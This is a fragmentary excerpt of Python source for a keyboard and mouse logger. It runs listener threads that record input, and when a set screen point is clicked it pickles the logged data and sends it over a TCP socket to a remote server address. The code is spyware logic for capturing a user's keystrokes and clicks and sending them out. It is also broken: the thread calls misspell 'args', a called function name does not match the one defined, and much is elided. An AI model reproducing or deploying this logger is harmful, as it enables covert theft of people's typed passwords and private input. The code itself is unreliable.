...
Thread1=threading.Thread(target=putkeyboard,agrs=(logdata,))
...
def on_click(x, y, button, pressed):
    ...
    if (x,y) ==(305,5):
        send_keyboard_data(logdata2)
        print('Thoat khoi phan mem')
...
def send_keymouse_data(data):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(server_address)  
    data_to_send2=pickle.dumps(data)
    client_socket.sendall(data_to_send2)
    client_socket.close()


def putkeymouse(logdata2):
    with mouse.Listener(
        on_move=on_move,
        on_click=on_click,
...
Thread2=threading.Thread(target=putkeymouse,agrs=(logdata2,))
